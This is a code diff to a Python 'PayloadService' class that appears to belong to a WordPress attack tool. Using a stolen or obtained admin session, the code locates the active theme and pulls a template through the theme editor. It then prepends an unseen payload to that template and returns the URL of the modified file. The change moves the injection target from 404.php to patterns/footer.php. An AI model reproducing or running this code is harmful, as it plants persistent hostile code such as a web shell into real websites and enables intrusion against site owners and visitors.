@@ -11,7 +11,7 @@ class PayloadService:
 
     def drop_payload(self) -> str:
         active_theme_name = self.get_theme_name()
-        form_data = self.get_theme_404_template_form_data(active_theme_name)
+        form_data = self.get_theme_footer_template_form_data(active_theme_name)
 
         if(not self.is_payload_already_dropped(form_data['newcontent'])):
             form_data['newcontent'] = self.payload + form_data['newcontent']
@@ -22,7 +22,7 @@ class PayloadService:
             if(not response.ok):
                 raise Exception('Error updating the template')
 
-        return f'{self.wp_url}/wp-content/themes/{active_theme_name}/404.php'
+        return f'{self.wp_url}/wp-content/themes/{active_theme_name}/patterns/footer.php'
 
     def get_theme_name(self) -> str:
         response = self.wp_admin_session.get(f'{self.wp_url}/wp-admin/themes.php', headers=DEFAULT_HEADERS)
@@ -37,8 +37,8 @@ class PayloadService:
 
         return active_theme_name
 
-    def get_theme_404_template_form_data(self, active_theme_name: str) -> dict:
-        response = self.wp_admin_session.get(f'{self.wp_url}/wp-admin/theme-editor.php?file=404.php&theme={active_theme_name}', headers=DEFAULT_HEADERS)
+    def get_theme_footer_template_form_data(self, active_theme_name: str) -> dict:
+        response = self.wp_admin_session.get(f'{self.wp_url}/wp-admin/theme-editor.php?file=patterns%2Ffooter.php&theme={active_theme_name}', headers=DEFAULT_HEADERS)
         if(not response.ok):
             raise Exception('Error getting theme data')
         soup = BeautifulSoup(response.text, 'lxml')
